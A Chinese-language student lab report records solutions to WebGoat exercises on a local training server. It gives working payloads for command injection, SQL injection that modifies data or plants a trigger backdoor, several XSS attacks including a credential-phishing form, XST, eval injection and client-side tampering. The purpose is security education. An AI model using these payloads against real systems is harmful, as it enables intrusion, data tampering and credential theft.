## lab1.3

1. 在官网下载webgoat安装包并安装

2. 通过安装好的webgoat的bin目录下的webgoat.bat运行webgoat

   ![image-20220430213941933](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220430213941933.png)

3. 在浏览器中通过http://localhost/WebGoat/attack访问webgoat

   ![image-20220430214001513](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220430214001513.png)

![image-20220430214030191](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220430214030191.png)

## lab1.4

### Injection Flaw

##### Command Injection

在tamper data中输入`%22+%26+ping+10.186.244.140`，以完成这一题；结果如下

![image-20220430223226978](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220430223226978.png)

![image-20220430223312308](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220430223312308.png)

##### Numeric SQL Injection

输入`101 UNION SELECT * FROM weather_data `以完成sql注入

![image-20220501002351568](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220501002351568.png)

##### Log Spoofing

输入以下代码以模拟登录成功log:`thy%0D%0ALogin failed for username: thy`；结果如下

![image-20220501002948419](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220501002948419.png)

##### XPATH Injection

输入以下代码以完成查询：`Smith' or 1=1 or 'a'='a`；结果如下图

![image-20220501003937121](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220501003937121.png)

##### String SQL Injection

输入`Smith' UNION SELECT * FROM user_data UNION SELECT * FROM user_data WHERE last_name='Smith`；结果如下

![image-20220501005009708](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220501005009708.png)

##### String SQL Injection

由于输入有大小限制，我们需要先修改input的最大值，再输入以下代码：`'or '1'='1 `；结果如下

![image-20220501093146873](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220501093146873.png)

![image-20220501093252679](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220501093252679.png)

![image-20220501093509808](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220501093509808.png)

##### Numeric SQL Injection

输入`101 or '1'='1' ORDER BY salary desc`；由于经理的薪水大概率是最高的，我们通过ORDER BY salary desc来获取经理的数据；结果如下：

![image-20220501105001678](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220501105001678.png)

##### Modify Data with SQL Injection

输入以下sql语句：`jsmith'; UPDATE salaries SET salary=100 WHERE userid='jsmith`；结果如下图

![image-20220501110311140](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220501110311140.png)

##### Add Data with SQL Injection

输入以下sql语句，`jsmith'; INSERT INTO salaries(userid,salary) VALUES('thy',123)--`；--用于注释掉后面的‘；结果如下

![image-20220501111128382](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220501111128382.png)

##### Database BackdoorsBlind Numeric SQL Injectio

输入以下sql语句设置后门`101;CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='john@hackme.com'WHERE userid = 101`

![image-20220501161524369](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220501161524369.png)

##### Blind String SQL Injectio

经过不断地二分测试，最后得pin=Jill，输入以下语句完成sql注入：`101;SELECT * FROM pins WHERE cc_number=1111222233334444 AND (pin ='Jill') `；结果如下

![image-20220501161924223](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220501161924223.png)

### XSS

##### Phishing with XSS

输入以下JavaScript代码以生成输入框

```javascript
<div>
    username:
</div>
<br />
<div>
    <input type="text" id="username" />
</div>
<br />
<div>
    password:
</div>
<br />
<div>
    <input type="password" id="password" />
</div>
<br />
<div>
    <button id="login" onclick="
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    var XSSimage = new Image();
    XSSimage.src='http://localhost/WebGoat/catcher?PROPERTY=yes&user='+username+'&password='+password+'';
    alert('XSS:' + XSSimage.src);
    ">
        login
    </button>
</div>
```

结果如下

![image-20220506154720792](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220506154720792.png)

##### Stage 1: Stored XSS

在个人界面的street栏修改为以下代码`<script>alert("attack");</script>`

![image-20220506160108963](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220506160108963.png)

##### Stage 3: Stored XSS Revisited

进入david界面后view bruce的个人界面

![image-20220506160622070](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220506160622070.png)

##### Stage 5: Reflected XSS

在搜索框中输入`<script>alert("attack!");</script>`,别的用户点击搜索时会受到攻击

![image-20220506162811523](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220506162811523.png)

##### Stored XSS Attacks

输入`<script>alert("attack!");</script>`完成XSS攻击

![image-20220506162815329](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220506162815329.png)

##### Cross Site Request Forgery (CSRF)

在message中输入以下代码，别的用户点击这个message时会被攻击

![image-20220506164253538](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220506164253538.png)

![image-20220506164331854](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220506164331854.png)

##### CSRF Prompt By-Pass

多增加一段用于确认confirm的代码

![image-20220506164730007](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220506164730007.png)

![image-20220506164755409](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220506164755409.png)

##### CSRF Token By-Pass

先进入如下界面`http://localhost/WebGoat/attack?Screen=2&menu=900&transferFunds=main`;输入一个数字点击提交以后莫名其妙的就通过了？

 不太理解了

![image-20220506170505475](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220506170505475.png)

![image-20220506170710881](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220506170710881.png)

##### HTTPOnly Test

点击read cookie，write cookie等进行体验

![image-20220506172416740](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220506172416740.png)

##### Cross Site Tracing (XST) Attacks

输入以下代码

```html
<script>
    var xmlHttp = new ActiveXObject("MicrosoftXMLHTTP"); 
    xmlHttp.open("TRACE","./",false);
    xmlHttp.send();
</script>
```

显示结果如下

![image-20220506192949418](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220506192949418.png)

## lab1.5

#### AJAX Security

##### Same Origin Policy Protection

点击第二个链接体验跨域请求后就通过了这一题

![image-20220511165603010](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511165603010.png)

##### LAB: DOM-Based cross-site scripting

stage1：输入`<img src=.http://localhost/WebGoat/images/logos/owasp.jpg./>`完成请求

![image-20220511165905338](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511165905338.png)

stage2：输入`<img src="x" onerror="alert('XSS')">`

![image-20220511170418716](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511170418716.png)

stage3：输入`    <iframe onload=javascript:alert('XSS')></iframe>`

![image-20220511170949632](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511170949632.png)

stage4：

输入以下代码

```html
Please enter your password:<BR><input type = "password" name="pass"/><button onClick="javascript:alert('I have your password: ' + pass.value);">Submit</button><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>
```

![image-20220511171347326](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511171347326.png)

stage5：

打开本地文件修改DOMXSS文件如下

![image-20220511172127309](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511172127309.png)

![image-20220511172137330](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511172137330.png)

##### LAB: Client Side Filtering

stage1：在开发者视图中可以直接看到对应的数据

![image-20220511183219188](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511183219188.png)

![image-20220511183240468](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511183240468.png)

stage2：修改`F:\WebGoat\WebGoat-5.4\tomcat\webapps\WebGoat\lessons\Ajax\clientSideFiltering.jsp`文件的部分内容如下

```jsp
	StringBuffer sb = new StringBuffer();
	
	sb.append("/Employees/Employee/[Managers/Manager/text() = " + userid + "]/UserID | ");
	sb.append("/Employees/Employee/[Managers/Manager/text() = " + userid + "]/FirstName | ");
	sb.append("/Employees/Employee/[Managers/Manager/text() = " + userid + "]/LastName | ");
	sb.append("/Employees/Employee/[Managers/Manager/text() = " + userid + "]/SSN | ");
	sb.append("/Employees/Employee/[Managers/Manager/text() = " + userid + "]/Salary ");
	
	String expression = sb.toString();
	
	
	System.out.print("expression:" + expression);
```

![image-20220511183941192](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511183941192.png)

##### DOM Injection

删除按钮上的disable属性后点击

![image-20220511184132207](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511184132207.png)

![image-20220511184148505](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511184148505.png)

##### XML Injection

在开发者视图中把name从check1003改成check1004；勾选后提交

![image-20220511184544834](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511184544834.png)

##### JSON Injection

在开发者视图中修改$600为\$200；选择第一个提交

![image-20220511185257437](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511185257437.png)

![image-20220511185309468](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511185309468.png)

##### Silent Transactions Attacks

先找到提交按钮绑定的processData函数；发现这个函数主要通过submitData()函数提交请求；修改提交按钮绑定的函数为submitData()

![image-20220511191850195](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511191850195.png)

![image-20220511192154459](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511192154459.png)

![image-20220511192246220](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511192246220.png)

![image-20220511192323509](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511192323509.png)

##### Dangerous Use of Eval

输入`123');alert(document.cookie);('`

![image-20220511193228639](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511193228639.png)

##### Insecure Client Storage

stage1：

在源代码中找到isValidCoupon函数；根据下面的decrypt函数可以推断出优惠码

![image-20220511193502217](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511193502217.png)

![image-20220511193607247](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511193607247.png)

![image-20220511194119398](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511194119398.png)

stage2：

由于计算总价时候使用的数据是f.PRC1.value；修改所有的value为0后purchase

![image-20220511194911263](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511194911263.png)

![image-20220511195057613](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511195057613.png)

#### Improper Error Handling

##### Fail Open Authentication Scheme

使用tamper data抓取发送的数据，删除掉password字段

![image-20220511214935194](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220511214935194.png)
